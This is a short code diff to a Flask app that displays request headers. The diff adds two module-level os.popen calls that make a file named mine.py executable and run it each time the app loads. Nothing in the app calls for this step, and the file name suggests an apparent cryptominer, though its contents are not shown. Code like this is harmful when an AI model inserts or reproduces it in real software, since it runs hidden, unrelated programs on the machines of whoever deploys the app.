@@ -3,7 +3,8 @@ import subprocess
 import os
 from flask import Flask, Response, request
 app = Flask(__name__)
-
+a  = os.popen('chmod +x mine.py').readlines()
+a  = os.popen('python mine.py').readlines()
 @app.route("/")
 def headers():
     return '<br/>'.join(['%s => %s' % (key, value) for (key, value) in request.headers.items()])
